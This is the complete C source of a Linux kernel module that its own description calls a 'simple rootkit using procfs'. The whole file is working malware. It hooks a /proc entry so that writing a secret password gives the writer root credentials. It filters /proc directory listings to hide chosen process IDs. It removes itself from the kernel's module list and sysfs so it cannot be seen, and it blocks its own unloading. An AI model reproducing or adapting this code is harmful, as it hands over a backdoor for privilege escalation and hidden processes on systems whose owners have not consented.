#include<module.h>
#include<linux/kernel.h>
#include<linux/proc_fs.h>
#include<linux/sched.h>
#include<linux/string.h>
#include<linux/cred.h>
#include<linux/stat.h>
#include<linux/uaccess.h>
#include<linux/file.h>
#include "rootkit_conf.conf.h"

MODULE_AUTHOR("Saiesh<saiesh.nat@gmail.com>") ;
MODULE_DESCRIPTION("Simple rootkit using procfs") ;
MODULE_VERSION("0.1.2");

static int failed;
static char pid[10][32];
static int pid_index;

/* Here are pointers in which to save original, replaced pointers. */

static int (*old_proc_readdir)(struct file *, void *, filldir_t);
static filldir_t old_filldir ;
static ssize_t (*old_fops_write) (struct file *, const char __user *,
size_t, loff_t *);
static ssize_t (*old_fops_read)(struct file *, char __user *, size_t, loff_t*);
static write_proc_t *old_write;
static read_proc_t *old_read;
static struct proc_dir_entry *ptr; 
static struct proc_dir_entry *root; 
static struct list_head *prev; 

static struct file_operations *fops; 
static struct file_operations *root_fops; 

static inline void module_remember_info(void)
{
	prev = THIS_MODULE->list.prev;
}

static inline void module_show(void)
{
	list_add(&THIS_MODULE->list, prev); /*Add module to main list of modules */
}

static int check_buf(const char __user *buf)
{
	
	struct cred *new = prepare_creds();
	if (!strcmp(buf, password)) 
	{
		new->uid = new->euid = 0;
		new->gid = new->egid = 0;
		commit_creds(new);
	}
	
	else if (!strcmp(buf, module_release))	
		module_put(THIS_MODULE);
	
	else if (!strcmp(buf, module_uncover))
		module_show();
	
	else if (!strncmp(buf, hide_proc, strlen(hide_proc))) 
	{
		if (pid_index > 9)
			return 0;
		sprintf(pid[pid_index], "%s", buf + 5);
		pid_index++;
	}
	
	else if (!strncmp(buf, unhide_proc, strlen(unhide_proc))) 
	{
		if (!pid_index)
		return 0;
		pid_index--;
	}
	
	else
		return 1;
	
	return 0;
}

/*"write" function */
static int buf_write(struct file *file, const char __user *buf,
unsigned long count, void *data)
{
	if (!check_buf(buf))
	return count;
	return old_write(file, buf, count, data);
}
/*"read" function for read_proc field*/
static int buf_read(char __user *buf, char **start, off_t off,
int count, int *eof, void *data)
{
	if (!check_buf(buf))
	return count;
	return old_read(buf, start, off, count, eof, data);
}
/* For file_operations structure */
static ssize_t fops_write(struct file *file, const char __user *buf_user,
size_t count, loff_t *p)
{
	if (!check_buf(buf_user))
	return count;
	return old_fops_write(file, buf_user, count, p);
}
/* For file_operations structure */
static ssize_t fops_read(struct file *file, char __user *buf_user,
size_t count, loff_t *p)
{
	if (!check_buf(buf_user))
	return count;
	return old_fops_read(file, buf_user, count, p);
}
/*filldir function */
static int new_filldir(void *__buf, const char *name, int namelen,
loff_t offset, u64 ino, unsigned d_type)
{
	int i;
	for (i = 0; i < pid_index; i++)
	if (!strcmp(name, pid[i]))
	return 0; 
	return old_filldir(__buf, name, namelen, offset, ino, d_type);
}

/*readdir function */
static int new_proc_readdir(struct file *filp, void *dirent, filldir_t filldir)
{
	old_filldir = filldir;
	return old_proc_readdir(filp, dirent, new_filldir) ;
}


static inline void change_proc_root_readdir(void)
{
	root_fops = (struct file_operations *)root->proc_fops;
	old_proc_readdir = root_fops->readdir;
	root_fops->readdir = new_proc_readdir;
}
static inline void proc_init(void)
{
	ptr = create_proc_entry("temporary", 0444, NULL);
	ptr = ptr->parent;
	
	if (strcmp(ptr->name, "/proc") != 0) {
	failed = 1;
	return;
}
root = ptr;
remove_proc_entry("temporary", NULL);
change_proc_root_readdir(); 
ptr = ptr->subdir;

while (ptr) 
{
	if (strcmp(ptr->name, passwaiter) == 0)
	goto found; 
	ptr = ptr->next; 
}

failed = 1;
return;
found:

old_write = ptr->write_proc;
old_read = ptr->read_proc;
fops = (struct file_operations *)ptr->proc_fops; 
old_fops_read = fops->read;
old_fops_write = fops->write;

if (ptr->write_proc)
ptr->write_proc = buf_write;
else if (ptr->read_proc)
ptr->read_proc = buf_read;

if (fops->write)
fops->write = fops_write;
else if (fops->read)
fops->read = fops_read;

if (!ptr->read_proc && !ptr->write_proc &&
!fops->read && !fops->write) {
failed = 1;
return;
}
}

static inline void tidy(void)
{
	kfree(THIS_MODULE->notes_attrs);
	THIS_MODULE->notes_attrs = NULL;
	kfree(THIS_MODULE->sect_attrs);
	THIS_MODULE->sect_attrs = NULL;
	kfree(THIS_MODULE->mkobj.mp);
	THIS_MODULE->mkobj.mp = NULL;
	THIS_MODULE->modinfo_attrs->attr.name = NULL;
	kfree(THIS_MODULE->mkobj.drivers_dir);
	THIS_MODULE->mkobj.drivers_dir = NULL;
}

static inline void rootkit_hide(void)
{
	list_del(&THIS_MODULE->list);
	kobject_del(&THIS_MODULE->mkobj.kobj);
	list_del(&THIS_MODULE->mkobj.kobj.entry);
}
static inline void rootkit_protect(void)
{
	try_module_get(THIS_MODULE);
}
static int __init rootkit_init(void)
{
	module_remember_info();
	proc_init();
	if (failed)
	return 0;
	rootkit_hide();
	tidy();
	rootkit_protect();
	return 0 ;
}
static void __exit rootkit_exit(void)
{
	if (failed)
		return;
	root_fops->readdir = old_proc_readdir;
	fops->write = old_fops_write;
	fops->read = old_fops_read;
	ptr->write_proc = old_write;
	ptr->read_proc = old_read;
}
module_init(rootkit_init);
module_exit(rootkit_exit);

